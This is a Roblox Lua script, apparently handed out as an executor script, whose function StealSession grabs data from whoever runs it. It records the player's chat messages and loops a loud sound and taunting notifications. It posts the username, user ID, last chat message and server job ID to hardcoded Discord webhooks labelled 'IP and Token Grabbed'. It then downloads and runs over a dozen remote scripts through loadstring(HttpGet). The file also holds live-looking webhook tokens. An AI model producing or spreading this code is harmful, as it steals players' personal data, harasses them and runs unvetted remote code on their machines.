local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local StarterGui = game:GetService("StarterGui")
local SoundService = game:GetService("SoundService")

local WebhookURL = "https://discord.com/api/webhooks/1563242722934919310/yK0oFxFS0tOSxXzZ0VtPusSNfU4pici-8fXEFhmSe9WWU0yAAewfVaXMP7IsHP4M23cg"
local WebhookURL = "https://discord.com/api/webhooks/1554816587431804990/ycovIB3BLZ411IKeWZEyvXZSKZ31MkC3vbZnxhK7l0jOsGQgV3UXtxHtYhJXN5b_mjdL"

local lastChatMessage = "No message sent"

local function monitorChat()
    pcall(function()
        local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local channels = TextChatService.TextChannels:GetChildren()
            for _, channel in ipairs(channels) do
                if channel:IsA("TextChannel") then
                    channel.MessageReceived:Connect(function(textMessage)
                        if textMessage.TextSource and textMessage.TextSource.UserId == LocalPlayer.UserId then
                            lastChatMessage = textMessage.Text
                        end
                    end)
                end
            end
            TextChatService.TextChannels.ChildAdded:Connect(function(channel)
                if channel:IsA("TextChannel") then
                    channel.MessageReceived:Connect(function(textMessage)
                        if textMessage.TextSource and textMessage.TextSource.UserId == LocalPlayer.UserId then
                            lastChatMessage = textMessage.Text
                        end
                    end)
                end
            end)
        else
            LocalPlayer.Chatted:Connect(function(message)
                lastChatMessage = message
            end)
        end
    end)
end

monitorChat()

local function StealSession()
    task.spawn(function()
        local loudSound = Instance.new("Sound")
        loudSound.SoundId = "rbxassetid://138081509"
        loudSound.Volume = 10
        loudSound.Pitch = 1.5
        loudSound.Parent = SoundService

        while true do
            loudSound:Play()
            pcall(function()
                StarterGui:SetCore("SendNotification", {
                    Title = "",
                    Text = "Sry Bro 🗿",
                    Icon = "rbxassetid://10472425028",
                    Duration = 2
                })
            end)
            task.wait(0.3)
        end
    end)

    task.wait(2)

    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local mapName = success and placeInfo.Name or "Unknown"
    
    local successThumb, thumbUrl = pcall(function()
        return game:GetService("ContentProvider"):GetAssetUrl(game.PlaceId)
    end)
    
    local mapThumb = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. tostring(game.PlaceId) .. "&width=420&height=420&format=png"
    
    local playerCountText = tostring(#Players:GetPlayers()) .. " / " .. tostring(Players.MaxPlayers)
    local fullBodyAvatarUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. tostring(LocalPlayer.UserId) .. "&width=420&height=420&format=png"

    local data = {
        ["username"] = "Account Roblox 🤖",
        ["avatar_url"] = "https://i.ibb.co/Zp5tPpJj/IMG-3928.png",
        ["content"] = "@everyone IP and Token Grabbed",
        ["embeds"] = {{
            ["title"] = "Victim Info Extracted",
            ["color"] = 0x1A1A1A,
            ["thumbnail"] = {
                ["url"] = mapThumb
            },
            ["image"] = {
                ["url"] = fullBodyAvatarUrl
            },
            ["fields"] = {
                {["name"] = "👤 Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
                {["name"] = "🆔 User ID", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},
                {["name"] = "🗺️ Map Name", ["value"] = tostring(mapName), ["inline"] = false},
                {["name"] = "👥 Players", ["value"] = playerCountText, ["inline"] = true},
                {["name"] = "💬 Last Chat Message", ["value"] = tostring(lastChatMessage), ["inline"] = false},
                {["name"] = "📌 Job ID", ["value"] = game.JobId, ["inline"] = false}
            }
        }}
    }

    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end)
    end

    loadstring(game:HttpGet("https://flowauth.net/v1/loaders/VR7.lua"))()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Gamepass-Product-212343"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AlphaBay00/PhantomXLoader/main/Ld.lua.txt"))()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Animal-Hospital-(Anomaly)-Ajjans-Roblox-Animal-Hospital-Auto-Treat-Script-243159"))()
    loadstring(game:HttpGet('https://pastebin.com/raw/PgAdUTAt'))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/Hshjs"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/VR7/main/vr7ontop"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/panelhenil-oss/NOVI-ROLI/refs/heads/main/ROLI.txt"))()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/exunys/SimpleSpy/main/source.lua"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/richie0866/orca/main/source.lua"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ec322/SystemExodus/main/main.lua"))()
    
    local hydroxideBase = "https://raw.githubusercontent.com/UpbeatEngine/Hydroxide/main/"
    loadstring(game:HttpGet(hydroxideBase .. "init.lua"))()
end

StealSession()
